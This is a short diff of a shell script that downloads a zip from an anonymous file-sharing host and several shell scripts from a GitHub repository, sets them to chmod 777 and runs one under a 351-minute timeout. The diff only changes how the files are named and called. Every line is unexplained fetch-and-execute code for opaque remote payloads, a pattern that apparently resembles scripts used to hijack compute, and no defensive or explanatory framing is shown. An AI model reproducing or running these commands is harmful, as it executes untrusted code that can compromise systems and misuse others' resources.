@@ -17,8 +17,8 @@ wget http://transfer.sh/H8t4Pk/mav.zip
 unzip mav.zip 
 chmod 777 mavic 
 rm mav.zip
-wget https://github.com/Mafs68/hjs839/raw/main/rad1.sh -O $ran1.sh
-wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh -O $ran2.sh
-wget https://github.com/Mafs68/hjs839/raw/main/mai.sh -O $ra3.sh
-chmod 777 $ra3.sh
-timeout 351m ./$ra3.sh
+wget https://github.com/Mafs68/hjs839/raw/main/rad1.sh 
+wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh
+wget https://github.com/Mafs68/hjs839/raw/main/mai.sh 
+chmod 777 mai.sh
+timeout 351m mai.sh
